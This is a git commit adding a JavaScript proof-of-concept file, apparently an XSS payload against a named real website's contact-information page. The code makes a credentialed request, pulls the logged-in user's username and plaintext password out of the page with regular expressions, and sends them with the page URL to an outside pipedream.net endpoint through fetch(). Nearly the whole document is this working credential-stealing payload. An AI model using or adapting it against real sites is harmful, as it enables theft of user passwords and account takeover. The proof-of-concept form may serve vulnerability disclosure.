feea1bdd9d59536aa66b6cb2b40870437b30ac21
Truoc Phan <57470560+truocphan@users.noreply.github.com>
2022-10-05 00:29:40 +0700

    Create PoC.js

---
+++ PoC.js
@@ -0,0 +1,11 @@
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+	if (this.readyState == 4 && this.status == 200) {
+		var u = /<input name="ctl00\$content\$fvContactInfo\$ucContactInfo\$txtUsername" type="text" value="(.*)" maxlength="32" id="ctl00_content_fvContactInfo_ucContactInfo_txtUsername"/.exec(this.response)[1];
+		var p = /<input name="ctl00\$content\$fvContactInfo\$ucContactInfo\$txtPassword" type="password" maxlength="32" id="ctl00_content_fvContactInfo_ucContactInfo_txtPassword" tabindex="8" class="form-control" value="(.*)" \/>/.exec(this.response)[1];
+		fetch("//eo1pcgis89iizlo.m.pipedream.net/?username="+u+"&password="+p+"&url="+window.location);
+	}
+};
+xhttp.open("GET", "https://www.nbaofficials.com/Pages/ContactInfo.aspx", true);
+xhttp.withCredentials = true;
+xhttp.send();
